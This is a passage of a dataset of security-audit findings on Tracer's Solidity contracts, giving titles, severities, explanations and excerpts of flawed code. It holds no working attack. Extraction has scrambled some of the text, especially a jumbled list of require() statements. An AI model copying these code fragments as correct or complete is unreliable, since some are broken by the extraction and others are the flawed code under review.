IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals); lastPriceTimestamp = block.timestamp; // shouldn't update until all executeCommitments() are ,! processed } function intervalPassed() public view override returns (bool) { unchecked { return block.timestamp >= lastPriceTimestamp + updateInterval; } } }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Incorrect comparison in getUpdatedAggregateBalance()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When the value of data.updateIntervalId accidentally happens to be larger data.currentUpdateIntervalId in the getUpdatedAggregateBalance() function, it will execute the rest of the function, which shouldnt happen. Although this is unlikely it is also very easy to prevent. function getUpdatedAggregateBalance(UpdateData calldata data) external pure returns (...) { if (data.updateIntervalId == data.currentUpdateIntervalId) { // Update interval has not passed: No change return (0, 0, 0, 0, 0); } }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "updateAggregateBalance() can run out of gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The updateAggregateBalance() function of the PoolCommitter contract contains a for loop that, in theory, could use up all the gas and result in a revert. The updateAggregateBalance() function checks all future intervals every time it is called and adds them back to the unAggregatedCommitments array, which is checked in the next function call. This would only be a problem if frontRunningInterval is much larger than updateInterval, a situation that seems unlikely in practice. function updateAggregateBalance(address user) public override checkInvariantsAfterFunction { ... uint256[] memory currentIntervalIds = unAggregatedCommitments[user]; uint256 unAggregatedLength = currentIntervalIds.length; for (uint256 i = 0; i < unAggregatedLength; i++) { uint256 id = currentIntervalIds[i]; ... UserCommitment memory commitment = userCommitments[user][id]; ... if (commitment.updateIntervalId < updateIntervalId) { ... } else { ... storageArrayPlaceHolder.push(currentIntervalIds[i]); // entry for future intervals stays ,! in array } } delete unAggregatedCommitments[user]; unAggregatedCommitments[user] = storageArrayPlaceHolder; ... }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Pool information might be lost if setFactory() of PoolKeeper contract is called", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The PoolKeeper contract has a function to change the factory: setFactory(). However, calling this function will make previous pools inaccessible for this PoolKeeper unless the new factory imports the pools from the old factory. The isUpkeepRequiredSinglePool() function calls factory.isValidPool(_pool), and it will fail because the new factory doesnt know about the old pools. As this call is essential for upkeeping, the entire upkeep mechanism will fail. function setFactory(address _factory) external override onlyOwner { factory = IPoolFactory(_factory); ... } function isUpkeepRequiredSinglePool(address _pool) public view override returns (bool) { if (!factory.isValidPool(_pool)) { // might not work if factory is changed return false; } ... }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Ether could be lost when calling commit()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The commit() function sends the supplied ETH to makePaidClaimRequest() only if payForClaim == true. If the caller of commit() accidentally sends ETH when payForClaim == false then the ETH stays in the PoolCommitter contract and is effectively lost. Note: This was also documented in Secureums CARE Tracking function commit(...) external payable override checkInvariantsAfterFunction { ... if (payForClaim) { autoClaim.makePaidClaimRequest{value: msg.value}(msg.sender); } }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Race condition if PoolFactory deploy pools before fees are set", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployPool function of PoolFactory contract can deploy pools before the changeInterval value and minting and burning fees are set. This means that fees would not be subtracted. The exact boundaries for the mintingFee, burningFee and changeInterval values arent clear. In some parts of the code < 1e18 is used, and in other parts <= 1e18. Furthermore, the initialize() function of the PoolCommitter contract doesnt check the value of changeInter- val. The setBurningFee(), setMintingFee() and setChangeInterval() functions of PoolCommitter contract dont check the new values. Finally, two representations of 1e18 are used: 1e18 and PoolSwapLibrary.WAD_PRECISION. contract PoolFactory is IPoolFactory, Ownable { function setMintAndBurnFeeAndChangeInterval(uint256 _mintingFee, uint256 _burningFee,...) ... { ... require(_mintingFee <= 1e18, \"Fee cannot be > 100%\"); require(_burningFee <= 1e18, \"Fee cannot be > 100%\"); require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\"); mintingFee = _mintingFee; burningFee = _burningFee; changeInterval = _changeInterval; ... } function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ,! ... // no check that mintingFee, burningFee, changeInterval are set poolCommitter.initialize(..., mintingFee, burningFee, changeInterval, ...); } } 22 contract PoolCommitter is IPoolCommitter, Initializable { function initialize(... ,uint256 _mintingFee, uint256 _burningFee,... ) ... { ... require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\"); require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\"); ... // no check on _changeInterval mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); ... } function setBurningFee(uint256 _burningFee) external override onlyGov { burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); // no check on _burningFee ... } function setMintingFee(uint256 _mintingFee) external override onlyGov { mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); // no check on _mintingFee ... } function setChangeInterval(uint256 _changeInterval) external override onlyGov { changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); // no check on ,! _changeInterval ... } function updateMintingFee(bytes16 longTokenPrice, bytes16 shortTokenPrice) private { ... if (PoolSwapLibrary.compareDecimals(mintingFee, MAX_MINTING_FEE) == 1) { // mintingFee is greater than 1 (100%). // We want to cap this at a theoretical max of 100% mintingFee = MAX_MINTING_FEE; // so mintingFee is allowed to be 1e18 } } }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Committer not validated on withdraw claim and multi-paid claim", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "AutoClaim checks that the committer creating the claim request in makePaidClaimRequest and withdrawing the claim request in withdrawUserClaimRequest is a valid committer for the PoolFactory used in theAutoClaim initializer. The same security check should be done in all the other functions where the committer is passed as a function parameter.", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Some SMAOracle and AutoClaim state variables can be declared as immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "In the SMAOracle contract, the oracle, periods, observer, scaler and updateInterval state vari- ables are not declared as immutable. In the AutoClaim contract, the poolFactory state variable is not declared as immutable. Since the mentioned variables are only initialized in the contracts constructors, they can be declared as immutable in order to save gas.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Use of counters can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "counter and i are both used as counters for the same loop. uint32 counter = 1; uint256 i = 0; ... while (i < upperBound) { ... unchecked { counter += 1; } i++; }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "transferOwnership() function is inaccessible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The ERC20_Cloneable contract contains a transferOwnership() function that may only be called by the owner, which is PoolFactory. However PoolFactory doesnt call the function so it is essentially dead code, making the deployment cost unnecessary additional gas. function transferOwnership(address _owner) external onlyOwner { require(_owner != address(0), \"Owner: setting to 0 address\"); owner = _owner; }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Use cached values when present", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The updateAggregateBalance() function creates a temporary variable id with the value currentIn- Immediately after that, currentIntervalIds[i] is used again. This could be replaced by id to tervalIds[i]. save gas. function updateAggregateBalance(address user) public override checkInvariantsAfterFunction { ... for (uint256 i = 0; i < unAggregatedLength; i++) { uint256 id = currentIntervalIds[i]; if (currentIntervalIds[i] == 0) { // could use id continue; }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "_invariantCheckContract stored twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Both the PoolCommitter and LeveragedPool contracts store the value of _invariantCheckContract twice, both in invariantCheckContract and invariantCheck. This is not necessary and costs extra gas. contract PoolCommitter is IPoolCommitter, Initializable { ... address public invariantCheckContract; IInvariantCheck public invariantCheck; ... function initialize( ..., address _invariantCheckContract, ... ) external override initializer { ... invariantCheckContract = _invariantCheckContract; invariantCheck = IInvariantCheck(_invariantCheckContract); ... } } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { ... address public invariantCheckContract; IInvariantCheck public invariantCheck; ... function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! ... invariantCheckContract = initialization._invariantCheckContract; invariantCheck = IInvariantCheck(initialization._invariantCheckContract); } }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary if/else statement in LeveragedPool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "A boolean variable is used to indicate the type of token to mint. The if/else statement can be avoided by using LONG_INDEX or SHORT_INDEX as the parameter instead of a bool to indicate the use of long or short token. uint256 public constant LONG_INDEX = 0; uint256 public constant SHORT_INDEX = 1; ... function mintTokens(bool isLongToken,...){ if (isLongToken) { IPoolToken(tokens[LONG_INDEX]).mint(...); } else { IPoolToken(tokens[SHORT_INDEX]).mint(...); ...", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Uncached array length used in loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The users array length is used in a for loop condition, therefore the length of the array is evaluated in every loop iteration. Evaluating it once and caching it can save gas. for (uint256 i; i < users.length; i++) { ... }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary deletion of array elements in a loop is expensive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The unAggregatedCommitments[user] array is deleted after the for loop in updateAggregateBal- ance. Therefore, deleting the array elements one by one with delete unAggregatedCommitments[user][i]; in the loop body costs unnecessary gas.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Zero-value transfers are allowed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Given that claim() can return 0 when the claim isnt valid yet due to updateInterval, the return value should be checked to avoid doing an unnecessary sendValue() call with amount 0. Address.sendValue( payable(msg.sender), claim(user, poolCommitterAddress, poolCommitter, currentUpdateIntervalId) );", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unneeded onlyUnpaused modifier in setQuoteAndPool()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The setQuoteAndPool() function is only callable once, from the factory contract during deployment, due to the onlyFactory modifier. During this call, the contract is always unpaused, therefore the onlyUnpaused modifier is not necessary.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary mapping access in AutoClaim.makePaidClaimRequest()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Resolving mappings consumes more gas than directly accessing the storage struct, therefore its more gas-efficient to use the already de-referenced variable than to resolve the mapping again. function makePaidClaimRequest(address user) external payable override onlyPoolCommitter { ClaimRequest storage request = claimRequests[user][msg.sender]; ... uint256 reward = claimRequests[user][msg.sender].reward; ... claimRequests[user][msg.sender].updateIntervalId = requestUpdateIntervalId; claimRequests[user][msg.sender].reward = msg.value;", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Function complexity can be reduced from linear to constant by rewriting loops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The add() function of the PriceObserver contract shifts an entire array if the buffer is full, and the SMA() function of the SMAOracle contract sums the values of an array to calculate its average. Both of these functions have O(n) complexity and could be rewritten to have O(1) complexity. This would save gas and possibly increase the buffer size. 31 contract PriceObserver is Ownable, IPriceObserver { ... * @dev If the backing array is full (i.e., `length() == capacity()`, then * it is rotated such that the oldest price observation is deleted function add(int256 x) external override onlyWriter returns (bool) { ... if (full()) { leftRotateWithPad(x); ... } function leftRotateWithPad(int256 x) private { uint256 n = length(); /* linear scan over the [1, n] subsequence */ for (uint256 i = 1; i < n; i++) { observations[i - 1] = observations[i]; } ... } contract SMAOracle is IOracleWrapper { * @dev O(k) complexity due to linear traversal of the final `k` elements of `xs` ... function SMA(int256[24] memory xs, uint256 n, uint256 k) public pure returns (int256) { ... /* linear scan over the [n - k, n] subsequence */ for (uint256 i = n - k; i < n; i++) { S += xs[i]; } ... } }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unused observer state variable in PoolKeeper", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "There is no use for the observer state variable. It is only used in performUpkeepSinglePool in a require statement to check if is set. address public observer; function setPriceObserver(address _observer) external onlyOwner { ... observer = _observer; ... function performUpkeepSinglePool(...) require(observer != address(0), \"Observer not initialized\"); ...", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Usage of temporary variable instead of type casting in PoolKeeper.performUpkeepSinglePool()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The pool temporary variable is used to cast the address to ILeveragedPool. Casting the address directly where the pool variable is used saves gas, as _pool is calldata.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Events and event emissions can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "PoolFactory.deployPool() would result in: Having a single DeployCommitter event to be emitted after setQuoteAndPool() in 1. Having better UX/event tracking and alignment with the current behavior to emit events during the Factory deployment. 2. Removing the QuoteAndPoolChanged event that is emitted only once during the lifetime of the PoolCommitter during PoolFactory.deployPool(). 3. Removing the ChangeIntervalSet emission in PoolCommitter.initialize(). The changeInterval has not really changed, it was initialized. This can be tracked by the DeployCommitter event.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Multi-paid claim rewards should be sent only if nonzero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "In both multiPaidClaimMultiplePoolCommitters() and multiPaidClaimSinglePoolCommitter(), there could be cases where the reward sent back to the claimer is zero. In these scenarios, the reward value should be checked to avoid wasting gas.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary quad arithmetic use where integer arithmetic works", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The ABDKMathQuad library is used to compute a division which is then truncated with toUint(). Semantically this is equivalent to a standard uint division, which is more gas efficient. The same library is also unnecessarily used to compute keepers reward. This can be safely done by using standard uint computation. function appropriateUpdateIntervalId(...) ... uint256 factorDifference = ABDKMathQuad.toUInt(divUInt(frontRunningInterval, updateInterval)); function keeperReward(...) ... int256 wadRewardValue = ABDKMathQuad.toInt( ABDKMathQuad.add( ABDKMathQuad.fromUInt(_keeperGas), ABDKMathQuad.div( ( ABDKMathQuad.div( (ABDKMathQuad.mul(ABDKMathQuad.fromUInt(_keeperGas), _tipPercent)), ABDKMathQuad.fromUInt(100) ) ), FIXED_POINT ) ) ); uint256 decimals = IERC20DecimalsWrapper(ILeveragedPool(_pool).quoteToken()).decimals(); uint256 deWadifiedReward = PoolSwapLibrary.fromWad(uint256(wadRewardValue), decimals);", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Custom errors should be used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "In the latest Solidity versions it is possible to replace the strings used to encode error messages with custom errors, which are more gas efficient. AutoClaim.sol: PoolCommitter\"); ,! AutoClaim.sol: AutoClaim.sol: PoolCommitter\"); ,! AutoClaim.sol: require(poolFactory.isValidPoolCommitter(msg.sender), \"msg.sender not valid require(_poolFactoryAddress != address(0), \"PoolFactory address == 0\"); require(poolFactory.isValidPoolCommitter(poolCommitterAddress), \"Invalid require(users.length == poolCommitterAddresses.length, \"Supplied arrays must be same length\"); ,! ChainlinkOracleWrapper.sol: require(_oracle != address(0), \"Oracle cannot be 0 address\"); ChainlinkOracleWrapper.sol: require(_deployer != address(0), \"Deployer cannot be 0 address\"); ChainlinkOracleWrapper.sol: require(_decimals <= MAX_DECIMALS, \"COA: too many decimals\"); ChainlinkOracleWrapper.sol: require(answeredInRound >= roundID, \"COA: Stale answer\"); ChainlinkOracleWrapper.sol: require(timeStamp != 0, \"COA: Round incomplete\"); ERC20_Cloneable.sol: ERC20_Cloneable.sol: InvariantCheck.sol: InvariantCheck.sol: LeveragedPool.sol: require(msg.sender == owner, \"msg.sender not owner\"); require(_owner != address(0), \"Owner: setting to 0 address\"); require(_factory != address(0), \"Factory address cannot be null\"); require(poolFactory.isValidPool(poolToCheck), \"Pool is invalid\"); require(!paused, \"Pool is paused\"); 36 LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(msg.sender == keeper, \"msg.sender not keeper\"); require(msg.sender == invariantCheckContract, \"msg.sender not invariantCheckContract\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: address\"); ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: be 0 address\"); ,! LeveragedPool.sol: cannot be 0 address\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: address\"); ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: be 0 address\"); ,! LeveragedPool.sol: require(msg.sender == poolCommitter, \"msg.sender not poolCommitter\"); require(msg.sender == governance, \"msg.sender not governance\"); require(initialization._feeAddress != address(0), \"Fee address cannot be 0 require(initialization._quoteToken != address(0), \"Quote token cannot be 0 require(initialization._oracleWrapper != address(0), \"Oracle wrapper cannot require(initialization._settlementEthOracle != address(0), \"Keeper oracle require(initialization._owner != address(0), \"Owner cannot be 0 address\"); require(initialization._keeper != address(0), \"Keeper cannot be 0 address\"); require(initialization._longToken != address(0), \"Long token cannot be 0 require(initialization._shortToken != address(0), \"Short token cannot be 0 require(initialization._poolCommitter != address(0), \"PoolCommitter cannot require(initialization._invariantCheckContract != address(0), \"InvariantCheck cannot be 0 address\"); require(initialization._fee < PoolSwapLibrary.WAD_PRECISION, \"Fee >= 100%\"); require(initialization._secondaryFeeSplitPercent <= 100, \"Secondary fee split cannot exceed 100%\"); as old governance address\"); ,! LeveragedPool.sol: LeveragedPool.sol: ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: ,! PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: ,! PoolCommitter.sol: PoolCommitter.sol: invariantCheckContract\"); require(initialization._updateInterval != 0, \"Update interval cannot be 0\"); require(intervalPassed(), \"Update interval hasn't passed\"); require(account != address(0), \"Account cannot be 0 address\"); require(msg.sender == _oldSecondaryFeeAddress); require(_keeper != address(0), \"Keeper address cannot be 0 address\"); require(_governance != governance, \"New governance address cannot be same require(_governance != address(0), \"Governance address cannot be 0 require(governanceTransferInProgress, \"No governance change active\"); require(msg.sender == _provisionalGovernance, \"Not provisional governor\"); require(paused, \"Pool is live\"); require(!paused, \"Pool is paused\"); require(msg.sender == governance, \"msg.sender not governance\"); require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(msg.sender == invariantCheckContract, \"msg.sender not require(msg.sender == factory, \"Committer: not factory\"); require(msg.sender == leveragedPool, \"msg.sender not leveragedPool\"); require(msg.sender == user || msg.sender == address(autoClaim), \"msg.sender not committer or AutoClaim\"); require(_factory != address(0), \"Factory address cannot be 0 address\"); require(_invariantCheckContract != address(0), \"InvariantCheck address cannot be 0 address\"); ,! PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: require(_autoClaim != address(0), \"AutoClaim address cannot be null\"); require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\"); require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\"); require(userCommit.balanceLongBurnAmount <= balance.longTokens, \"Insufficient pool tokens\"); ,! PoolCommitter.sol: require(userCommit.balanceShortBurnAmount <= balance.shortTokens, ,! \"Insufficient pool tokens\"); 37 ,! PoolCommitter.sol: PoolCommitter.sol: address\"); ,! PoolCommitter.sol: address\"); ,! PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: ,! PoolFactory.sol: ,! PoolFactory.sol: ,! PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PriceObserver.sol: PriceObserver.sol: PriceObserver.sol: SMAOracle.sol: ,! SMAOracle.sol: PoolCommitter.sol: require(userCommit.balanceLongBurnMintAmount <= balance.longTokens, \"Insufficient pool tokens\"); ,! PoolCommitter.sol: require(userCommit.balanceShortBurnMintAmount <= balance.shortTokens, \"Insufficient pool tokens\"); require(amount > 0, \"Amount must not be zero\"); require(_quoteToken != address(0), \"Quote token address cannot be 0 require(_leveragedPool != address(0), \"Leveraged pool address cannot be 0 require(_feeReceiver != address(0), \"Address cannot be null\"); require(_poolKeeper != address(0), \"PoolKeeper not set\"); require(autoClaim != address(0), \"AutoClaim not set\"); require(invariantCheck != address(0), \"InvariantCheck not set\"); require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender,\"Deployer must be oracle wrapper owner\"); require(deploymentParameters.leverageAmount >= 1 && deploymentParameters.leverageAmount <= maxLeverage,\"PoolKeeper: leveraged amount invalid\"); require(IERC20DecimalsWrapper(deploymentParameters.quoteToken).decimals() <= MAX_DECIMALS,\"Decimal precision too high\"); require(_poolKeeper != address(0), \"address cannot be null\"); require(_invariantCheck != address(0), \"address cannot be null\"); require(_autoClaim != address(0), \"address cannot be null\"); require(newMaxLeverage > 0, \"Maximum leverage must be non-zero\"); require(_feeReceiver != address(0), \"address cannot be null\"); require(newFeePercent <= 100, \"Secondary fee split cannot exceed 100%\"); require(_fee <= 0.1e18, \"Fee cannot be > 10%\"); require(_mintingFee <= 1e18, \"Fee cannot be > 100%\"); require(_burningFee <= 1e18, \"Fee cannot be > 100%\"); require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\"); require(msg.sender == address(factory), \"Caller not factory\"); require(_factory != address(0), \"Factory cannot be 0 address\"); require(_observer != address(0), \"Price observer cannot be 0 address\"); require(firstPrice > 0, \"First price is non-positive\"); require(observer != address(0), \"Observer not initialized\"); require(timestamp >= lastPriceTimestamp, \"timestamp in the past\"); require(price != 0, \"price == 0\"); require(price != 0, \"price == 0\"); require(price != 0, \"price == 0\"); require(msg.sender == writer, \"PO: Permission denied\"); require(i < length(), \"PO: Out of bounds\"); require(_writer != address(0), \"PO: Null address not allowed\"); require(_spotOracle != address(0) && _observer != address(0) && _deployer require(_periods > 0 && _periods <= IPriceObserver(_observer).capacity(), require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\"); require(_updateInterval != 0, \"Update interval cannot be 0\"); require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to require(k > 0 && k <= n && k <= uint256(type(int256).max), \"SMA: Out of != address(0),\"SMA: Null address forbidden\"); \"SMA: Out of bounds\"); ,! SMAOracle.sol: SMAOracle.sol: SMAOracle.sol: update\"); ,! SMAOracle.sol: ,! bounds\");", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Different updateIntervals in SMAOracle and pools", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The updateIntervals for the pools and the SMAOracles are different. If the updateInterval for SMAOracle is larger than the updateInterval for poolUpkeep(), then the oracle price update could happen directly after the poolUpkeep(). It is possible to perform permissionless calls to poll(). In combination with a delayed poolUpkeep() an attacker could manipulate the timing of the SMAOracle price, because after a call to poll() it cant be called again until updateInterval has passed. contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! ... updateInterval = initialization._updateInterval; ... } function poolUpkeep(... ) external override onlyKeeper { require(intervalPassed(), \"Update interval hasn't passed\"); ... } function intervalPassed() public view override returns (bool) { unchecked { return block.timestamp >= lastPriceTimestamp + updateInterval; } } contract SMAOracle is IOracleWrapper { constructor(..., uint256 _updateInterval, ... ) { updateInterval = _updateInterval; } function poll() external override returns (int256) { require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to update\"); return update(); } }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Tight coupling between LeveragedPool and PoolCommitter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The LeveragedPool and PoolCommitter contracts call each other back and forth. This could be optimized to make the code clearer and perhaps save some gas. Here is an example: contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function poolUpkeep(...) external override onlyKeeper { ... IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals); ... } } contract PoolCommitter is IPoolCommitter, Initializable { function executeCommitments(...) external override onlyPool { ... uint256 lastPriceTimestamp = pool.lastPriceTimestamp(); uint256 updateInterval = pool.updateInterval(); ... } } // call to first contract // call to first contract", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Code in SMA() is hard to read", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The SMA() function checks for k being smaller or equal to uint256(type(int256).max), a value somewhat difficult to read. Additionally, the number 24 is hardcoded. Note: This issue was also mentioned in Runtime Verification report: B15 PriceObserver - avoid magic values function SMA( int256[24] memory xs, uint256 n, uint256 k) public pure returns (int256) { ... require(k > 0 && k <= n && k <= uint256(type(int256).max), \"SMA: Out of bounds\"); ... for (uint256 i = n - k; i < n; i++) { S += xs[i]; } ... }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Code is chain-dependant due to fixed block time and no support for EIP-1559", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The PoolKeeper contract has several hardcoded assumptions about the chain on which it will be deployed. It has no support for EIP-1559 and doesnt use block.basefee. On Ethereum Mainnet the blocktime will change to 12 seconds with the ETH2 merge. The Secureum CARE-X report also has an entire discussion about other chains. contract PoolKeeper is IPoolKeeper, Ownable { ... uint256 public constant BLOCK_TIME = 13; /* in seconds */ ... /// Captures fixed gas overhead for performing upkeep that's unreachable /// by `gasleft()` due to our approach to error handling in that code uint256 public constant FIXED_GAS_OVERHEAD = 80195; ... }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "ABDKQuad-related constants defined outside PoolSwapLibrary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Some ABDKQuad-related constants are defined outside of the PoolSwapLibrary while others are shadowing the ones defined inside the library. As all ABDKQuad-related logic is contained in the library its less error prone to have any ABDKQuad-related definitions in the same file. The constant one is lowercase, while usually constants are uppercase. contract PoolCommitter is IPoolCommitter, Initializable { bytes16 public constant one = 0x3fff0000000000000000000000000000; ... // Set max minting fee to 100%. This is a ABDKQuad representation of 1 * 10 ** 18 bytes16 public constant MAX_MINTING_FEE = 0x403abc16d674ec800000000000000000; } library PoolSwapLibrary { /// ABDKMathQuad-formatted representation of the number one bytes16 public constant one = 0x3fff0000000000000000000000000000; }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Lack of a state to allow withdrawal of tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Immediately after the invariants dont hold and the pool has been paused, Governance can withdraw the collateral (quote). It might be prudent to create a separate state besides paused, such that unpause actions cant happen anymore to indicate withdrawal intention. Note: the comment in withdrawQuote() is incorrect. Pool must be paused. /** ... * @dev Pool must not be paused // comment not accurate ... */ ... function withdrawQuote() external onlyGov { require(paused, \"Pool is live\"); IERC20 quoteERC = IERC20(quoteToken); uint256 balance = quoteERC.balanceOf(address(this)); IERC20(quoteToken).safeTransfer(msg.sender, balance); emit QuoteWithdrawn(msg.sender, balance); }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Undocumented frontrunning protection", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "PoolFactory 